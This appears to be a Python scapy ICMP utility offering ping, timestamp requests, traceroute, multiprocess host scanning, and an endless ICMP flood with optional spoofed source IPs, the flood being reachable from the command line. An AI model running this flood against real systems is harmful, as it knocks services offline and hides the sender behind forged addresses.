import concurrent
import ipaddress
import sys
from argparse import ArgumentParser
from concurrent.futures.process import ProcessPoolExecutor

from scapy.layers.inet import *
from scapy.sendrecv import send

sys.path.append('..')
from Network.Tools import Tools


class Icmp:

    def __init__(self, timeout=2, verbose=False):
        """
        ICMP协议
        :param timeout: 超时时间
        :param verbose: 是否输出调试信息
        """
        self.__timeout = timeout
        self.__verbose = verbose


    def request_echo(self, pdst):
        """
        发送request echo请求
        :param pdst: 目的地ip地址
        :return: icmp响应数据包
        """
        packet = IP(dst=pdst)/ICMP(type=8, code=0)/b'echo payload'
        response = sr1(packet, timeout=self.__timeout, verbose=self.__verbose)

        return response.getlayer(ICMP) if response else None


    def request_timestamp(self, pdst):
        """
        发送request timestamp请求，注意，请使用管理员模式运行
        :param pdst: 目的地IP地址
        :return: icmp响应数据包
        """
        packet = IP(dst=pdst)/ICMP(type=13, code=0)/b'timestamp payload'
        response = sr1(packet, timeout=self.__timeout, verbose=self.__verbose)

        return response.getlayer(ICMP) if response else None


    def tracert(self, pdst):
        """
        路径检测
        :param pdst: 目的地IP地址
        """
        for ttl in range(0, 32):
            start_time = time.time()
            packet = IP(dst=pdst, ttl=ttl)/ICMP(type=8, code=0)/b'tracert payload'
            answered, _ = sr(packet, timeout=3, verbose=self.__verbose)
            interval_time = (time.time() - start_time) * 1000
            if answered:
                response = answered.res[0][1]
                ip = response.getlayer(IP).src
                icmp = response.getlayer(ICMP)
                print(f'{ttl}\treach {ip}\t\t{interval_time:.2f} ms')
                if icmp.code == 0 and icmp.type== 0: break
            else:
                print(f'{ttl}\treach *')


    def flood(self, pdst, pfake=False):
        """
        ICMP flood
        :param pdst: 目标主机ip地址
        :param pfake: 是否伪造ip地址
        """
        while True:
            if pfake:
                psrc = Tools.get_random_ip()
                packet = IP(dst=pdst, src=psrc)/ICMP(type=8, code=0)/b'abcdefg'
            else:
                packet = IP(dst=pdst)/ICMP(type=8, code=0)/b'abcdefg'

            send(packet, count=1, verbose=self.__verbose)
            print(f'send packet dst = {pdst}, src = {packet.getlayer(IP).src}')



    def scan_host(self, pdst):
        """
        扫描目标ip地址段，获取存活主机信息
        :param pdst: 目标ip地址段
        :return: 存活主机ip地址列表
        """
        host = []
        for ip in pdst:
            response = self.request_echo(str(ip))
            print(f'current start test host: {ip}')
            if response: host.append(ip)

        return host


    def async_host_scan(self, pdst, process_count=4):
        """
        使用多线程进行主机扫描
        :param pdst: 目标主机
        :param process_count: 核心数
        :return: 存活主机ip地址
        """
        ips = list(ipaddress.ip_network(pdst).hosts())

        if len(ips) < 4:
            process_count = 1

        host = []
        with ProcessPoolExecutor(max_workers=process_count) as executor:
            future_of_func = [executor.submit(self.scan_host, ips[i::process_count]) for i in range(0, process_count)]
            for future in concurrent.futures.as_completed(future_of_func):
                host.append(future.result())

        return host


class InteractionIcmp:

    @staticmethod
    def run():
        parser = ArgumentParser('icmp tools')
        parser.add_argument('-v', '--verbose', action='store_true', help='display the debug information' )
        parser.add_argument('-p', '--pdst', type=str, required=True, help='the destination ip of host')
        parser.add_argument('--spool', action='store_true', help='fake the source ip')
        parser.add_argument('-t', '--thread', type=int, default=4, help='the count of thread for scan host')

        mutual_group = parser.add_mutually_exclusive_group()
        mutual_group.add_argument('--echo', action='store_true', help='request echo icmp message')
        mutual_group.add_argument('--timestamp', action='store_true', help='timestamp request icmp message')
        mutual_group.add_argument('--tracert', action='store_true', help='icmp tracert')
        mutual_group.add_argument('--flood', action='store_true', help='icmp flood')
        mutual_group.add_argument('--scan', action='store_true', help='scan host')

        args = parser.parse_args()

        icmp = Icmp(verbose=args.verbose)

        if args.echo:
            response = icmp.request_echo(args.pdst)
            response.show() if response else print('do not find the host')
        elif args.timestamp:
            response = icmp.request_timestamp(args.pdst)
            response.show() if response else print('do not find the host')
        elif args.tracert:
            icmp.tracert(args.pdst)
        elif args.flood:
            icmp.flood(args.pdst, pfake=args.spool)
        elif args.scan:
            host = icmp.async_host_scan(args.pdst, process_count=args.thread)
            print('the list of active host')
            print(host)
        else:
            print('please input the correct arguments')


if __name__ == '__main__':
    InteractionIcmp.run()
